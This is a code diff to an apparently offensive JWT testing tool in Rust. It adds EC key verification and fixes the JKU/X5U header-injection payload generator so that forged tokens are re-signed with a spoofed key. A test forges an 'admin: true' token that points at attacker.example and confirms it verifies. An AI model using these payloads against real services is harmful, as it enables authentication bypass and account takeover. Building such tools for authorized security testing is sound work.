@@ -134,6 +134,59 @@ pub fn jwk_rsa_to_pem(jwk: &Jwk) -> Result<String> {
     Ok(pem)
 }
 
+/// Convert a JWK EC public key (`crv`/`x`/`y`) to a SubjectPublicKeyInfo PEM.
+///
+/// Supports the P-256/P-384/P-521 curves used by ES256/ES384/ES512. Building the
+/// key through OpenSSL from the affine coordinates avoids hand-rolling EC point /
+/// named-curve DER encoding.
+pub fn jwk_ec_to_pem(jwk: &Jwk) -> Result<String> {
+    use openssl::bn::BigNum;
+    use openssl::ec::{EcGroup, EcKey};
+    use openssl::nid::Nid;
+    use openssl::pkey::PKey;
+
+    if jwk.kty != "EC" {
+        return Err(anyhow!("JWK is not an EC key (kty: {})", jwk.kty));
+    }
+
+    let crv = jwk
+        .crv
+        .as_deref()
+        .ok_or_else(|| anyhow!("Missing 'crv' parameter in EC JWK"))?;
+    let nid = match crv {
+        "P-256" => Nid::X9_62_PRIME256V1,
+        "P-384" => Nid::SECP384R1,
+        "P-521" => Nid::SECP521R1,
+        other => return Err(anyhow!("Unsupported EC curve: {}", other)),
+    };
+
+    let x = jwk
+        .x
+        .as_ref()
+        .ok_or_else(|| anyhow!("Missing 'x' parameter in EC JWK"))?;
+    let y = jwk
+        .y
+        .as_ref()
+        .ok_or_else(|| anyhow!("Missing 'y' parameter in EC JWK"))?;
+    let x_bytes = URL_SAFE_NO_PAD
+        .decode(x)
+        .map_err(|e| anyhow!("Failed to decode 'x': {}", e))?;
+    let y_bytes = URL_SAFE_NO_PAD
+        .decode(y)
+        .map_err(|e| anyhow!("Failed to decode 'y': {}", e))?;
+
+    let x_bn = BigNum::from_slice(&x_bytes)?;
+    let y_bn = BigNum::from_slice(&y_bytes)?;
+    let group = EcGroup::from_curve_name(nid)?;
+    let ec_key = EcKey::from_public_key_affine_coordinates(&group, &x_bn, &y_bn)?;
+    ec_key
+        .check_key()
+        .map_err(|e| anyhow!("EC public key is not valid for curve {}: {}", crv, e))?;
+    let pkey = PKey::from_ec_key(ec_key)?;
+    let pem = pkey.public_key_to_pem()?;
+    String::from_utf8(pem).map_err(|e| anyhow!("EC PEM is not valid UTF-8: {}", e))
+}
+
 /// Encode RSA public key components into DER (SubjectPublicKeyInfo) format
 fn encode_rsa_public_key_der(n: &[u8], e: &[u8]) -> Vec<u8> {
     // Encode n and e as ASN.1 INTEGERs
@@ -367,6 +420,48 @@ pub fn verify_with_jwks(token: &str, jwks: &JwkSet) -> Result<Vec<KeyVerifyResul
                     });
                 }
             },
+            "EC" => match jwk_ec_to_pem(jwk) {
+                Ok(pem) => {
+                    let options = crate::jwt::VerifyOptions {
+                        key_data: crate::jwt::VerifyKeyData::PublicKeyPem(&pem),
+                        validate_exp: false,
+                        validate_nbf: false,
+                        leeway: 0,
+                    };
+                    match crate::jwt::verify_with_options(token, &options) {
+                        Ok(valid) => {
+                            results.push(KeyVerifyResult {
+                                key_index: i,
+                                kid: kid.to_string(),
+                                kty: jwk.kty.clone(),
+                                alg: jwk.alg.clone(),
+                                valid,
+                                error: None,
+                            });
+                        }
+                        Err(e) => {
+                            results.push(KeyVerifyResult {
+                                key_index: i,
+                                kid: kid.to_string(),
+                                kty: jwk.kty.clone(),
+                                alg: jwk.alg.clone(),
+                                valid: false,
+                                error: Some(e.to_string()),
+                            });
+                        }
+                    }
+                }
+                Err(e) => {
+                    results.push(KeyVerifyResult {
+                        key_index: i,
+                        kid: kid.to_string(),
+                        kty: jwk.kty.clone(),
+                        alg: jwk.alg.clone(),
+                        valid: false,
+                        error: Some(format!("Key conversion failed: {}", e)),
+                    });
+                }
+            },
             "oct" => {
                 if let Some(k) = &jwk.k {
                     match URL_SAFE_NO_PAD.decode(k) {
@@ -453,6 +548,24 @@ pub struct KeyVerifyResult {
     pub error: Option<String>,
 }
 
+/// Map an RSA `alg` name to its [`jsonwebtoken::Algorithm`]. Only the RSA family
+/// is accepted, matching the algorithms [`generate_spoofed_jwks`] can produce.
+fn jwt_algorithm_from_str(algorithm: &str) -> Result<jsonwebtoken::Algorithm> {
+    use jsonwebtoken::Algorithm;
+    match algorithm.to_uppercase().as_str() {
+        "RS256" => Ok(Algorithm::RS256),
+        "RS384" => Ok(Algorithm::RS384),
+        "RS512" => Ok(Algorithm::RS512),
+        "PS256" => Ok(Algorithm::PS256),
+        "PS384" => Ok(Algorithm::PS384),
+        "PS512" => Ok(Algorithm::PS512),
+        other => Err(anyhow!(
+            "Unsupported algorithm for JWKS injection: {}",
+            other
+        )),
+    }
+}
+
 /// Generate JKU/X5U injection payloads with a real spoofed JWKS
 pub fn generate_jwks_injection_payloads(
     token: &str,
@@ -471,46 +584,47 @@ pub fn generate_jwks_injection_payloads(
         return Err(anyhow!("Invalid signed token format"));
     }
 
-    // Re-encode headers with jku/x5u pointing to attacker URL
+    // Decode the signed token for the header (its kid → picks the spoofed key) and claims.
     let decoded = crate::jwt::decode(&signed_token)?;
     let claims_part = parts[1];
-    let signature_part = parts[2];
 
-    let mut payloads = Vec::new();
+    // Injecting jku/x5u changes the header, and therefore the signing input, so the
+    // spoofed token's original signature no longer covers it. Re-sign each variant
+    // with the spoofed private key over the new `header.claims`; without this the
+    // payload never verifies against the attacker-hosted JWKS, defeating the attack.
+    let jwt_alg = jwt_algorithm_from_str(algorithm)?;
+    let encoding_key = jsonwebtoken::EncodingKey::from_rsa_pem(spoofed.private_key_pem.as_bytes())
+        .map_err(|e| anyhow!("Failed to load spoofed private key for re-signing: {}", e))?;
 
-    // JKU injection
-    let mut jku_header = serde_json::Map::new();
-    for (k, v) in &decoded.header {
-        jku_header.insert(k.clone(), v.clone());
-    }
-    jku_header.insert(
-        "jku".to_string(),
-        Value::String(format!("{}/jwks.json", attacker_url.trim_end_matches('/'))),
-    );
-    let jku_header_json = serde_json::to_string(&jku_header)?;
-    let jku_header_b64 = URL_SAFE_NO_PAD.encode(jku_header_json.as_bytes());
-    payloads.push(InjectionPayload {
-        header_type: "jku".to_string(),
-        token: format!("{}.{}.{}", jku_header_b64, claims_part, signature_part),
-        description: format!("JKU injection pointing to {}/jwks.json", attacker_url),
-    });
+    let sign_injection = |header_key: &str, url: String| -> Result<InjectionPayload> {
+        let mut header = serde_json::Map::new();
+        for (k, v) in &decoded.header {
+            header.insert(k.clone(), v.clone());
+        }
+        header.insert(header_key.to_string(), Value::String(url.clone()));
+        let header_json = serde_json::to_string(&header)?;
+        let header_b64 = URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+        let signing_input = format!("{header_b64}.{claims_part}");
+        let signature_b64 =
+            jsonwebtoken::crypto::sign(signing_input.as_bytes(), &encoding_key, jwt_alg).map_err(
+                |e| anyhow!("Failed to re-sign {} injection payload: {}", header_key, e),
+            )?;
+        Ok(InjectionPayload {
+            header_type: header_key.to_string(),
+            token: format!("{signing_input}.{signature_b64}"),
+            description: format!(
+                "{} injection pointing to {}",
+                header_key.to_uppercase(),
+                url
+            ),
+        })
+    };
 
-    // X5U injection
-    let mut x5u_header = serde_json::Map::new();
-    for (k, v) in &decoded.header {
-        x5u_header.insert(k.clone(), v.clone());
-    }
-    x5u_header.insert(
-        "x5u".to_string(),
-        Value::String(format!("{}/cert.pem", attacker_url.trim_end_matches('/'))),
-    );
-    let x5u_header_json = serde_json::to_string(&x5u_header)?;
-    let x5u_header_b64 = URL_SAFE_NO_PAD.encode(x5u_header_json.as_bytes());
-    payloads.push(InjectionPayload {
-        header_type: "x5u".to_string(),
-        token: format!("{}.{}.{}", x5u_header_b64, claims_part, signature_part),
-        description: format!("X5U injection pointing to {}/cert.pem", attacker_url),
-    });
+    let base = attacker_url.trim_end_matches('/');
+    let payloads = vec![
+        sign_injection("jku", format!("{base}/jwks.json"))?,
+        sign_injection("x5u", format!("{base}/cert.pem"))?,
+    ];
 
     Ok(JwksInjectionResult {
         jwks_json: spoofed.jwks_json,
@@ -707,6 +821,120 @@ mod tests {
     fn test_generate_spoofed_jwks_unsupported_alg() {
         let result = generate_spoofed_jwks("ES256", None, None);
         assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_verify_with_jwks_ec_p256_key() {
+        // Regression: EC keys (kty:"EC") were reported "Unsupported key type", so an
+        // ES256 token — one of the most common JWT signatures — could never be
+        // verified against its JWKS. Build a real P-256 key, sign a token with it,
+        // publish the public key as an EC JWK, and confirm verification succeeds.
+        use openssl::bn::BigNumContext;
+        use openssl::ec::{EcGroup, EcKey};
+        use openssl::nid::Nid;
+        use openssl::pkey::PKey;
+
+        let group = EcGroup::from_curve_name(Nid::X9_62_PRIME256V1).unwrap();
+        let ec = EcKey::generate(&group).unwrap();
+        let pkey = PKey::from_ec_key(ec.clone()).unwrap();
+        let priv_pem = String::from_utf8(pkey.private_key_to_pem_pkcs8().unwrap()).unwrap();
+
+        let claims = serde_json::json!({ "sub": "ec-user" });
+        let options = crate::jwt::EncodeOptions {
+            algorithm: "ES256",
+            key_data: crate::jwt::KeyData::PrivateKeyPem(&priv_pem),
+            header_params: None,
+            compress_payload: false,
+        };
+        let token = crate::jwt::encode_with_options(&claims, &options).expect("sign ES256 token");
+
+        // Extract affine coordinates for the JWK.
+        let mut ctx = BigNumContext::new().unwrap();
+        let mut x = openssl::bn::BigNum::new().unwrap();
+        let mut y = openssl::bn::BigNum::new().unwrap();
+        ec.public_key()
+            .affine_coordinates_gfp(&group, &mut x, &mut y, &mut ctx)
+            .unwrap();
+        let jwk = Jwk {
+            kty: "EC".to_string(),
+            kid: Some("ec-1".to_string()),
+            alg: Some("ES256".to_string()),
+            key_use: Some("sig".to_string()),
+            key_ops: None,
+            n: None,
+            e: None,
+            crv: Some("P-256".to_string()),
+            x: Some(URL_SAFE_NO_PAD.encode(x.to_vec())),
+            y: Some(URL_SAFE_NO_PAD.encode(y.to_vec())),
+            k: None,
+            x5c: None,
+            x5t: None,
+            x5t_s256: None,
+            extra: HashMap::new(),
+        };
+
+        // jwk_ec_to_pem must produce a usable SPKI PEM.
+        assert!(jwk_ec_to_pem(&jwk).unwrap().contains("BEGIN PUBLIC KEY"));
+
+        let jwks = JwkSet {
+            keys: vec![jwk.clone()],
+        };
+        let results = verify_with_jwks(&token, &jwks).expect("verify");
+        assert!(
+            results[0].valid,
+            "ES256 token must verify against its EC JWK, got {:?}",
+            results[0]
+        );
+
+        // A different EC key must NOT verify (valid:false, not an error).
+        let other = EcKey::generate(&group).unwrap();
+        let mut x2 = openssl::bn::BigNum::new().unwrap();
+        let mut y2 = openssl::bn::BigNum::new().unwrap();
+        other
+            .public_key()
+            .affine_coordinates_gfp(&group, &mut x2, &mut y2, &mut ctx)
+            .unwrap();
+        let mut wrong = jwk;
+        wrong.x = Some(URL_SAFE_NO_PAD.encode(x2.to_vec()));
+        wrong.y = Some(URL_SAFE_NO_PAD.encode(y2.to_vec()));
+        let wrong_jwks = JwkSet { keys: vec![wrong] };
+        let wrong_results = verify_with_jwks(&token, &wrong_jwks).expect("verify");
+        assert!(!wrong_results[0].valid, "wrong EC key must not verify");
+        assert!(wrong_results[0].error.is_none());
+    }
+
+    #[test]
+    fn test_jwks_injection_payloads_verify_against_spoofed_jwks() {
+        // The whole point of a jku/x5u injection payload is that once the server
+        // fetches the attacker-hosted JWKS, the token verifies against it. That
+        // requires the signature to cover the *injected* header. Previously the
+        // header was rebuilt (jku/x5u added, keys re-serialized) but the original
+        // signature was kept, so the payloads never verified.
+        let claims = serde_json::json!({ "sub": "victim", "admin": true });
+        let token = crate::jwt::encode(&claims, "irrelevant", "HS256").expect("build source token");
+
+        let result = generate_jwks_injection_payloads(&token, "https://attacker.example", "RS256")
+            .expect("generate injection payloads");
+
+        let jwks: JwkSet = serde_json::from_str(&result.jwks_json).expect("parse spoofed jwks");
+
+        assert_eq!(result.payloads.len(), 2, "expected jku and x5u payloads");
+        for p in &result.payloads {
+            let verdicts = verify_with_jwks(&p.token, &jwks).expect("verify against jwks");
+            assert!(
+                verdicts.iter().any(|v| v.valid),
+                "{} injection payload must verify against the spoofed JWKS, got {:?}",
+                p.header_type,
+                verdicts
+            );
+            // The injected header must actually carry the jku/x5u pointer.
+            let header = crate::jwt::decode(&p.token).expect("decode payload").header;
+            assert!(
+                header.contains_key(&p.header_type),
+                "payload header missing injected {} field",
+                p.header_type
+            );
+        }
     }
 
     #[test]
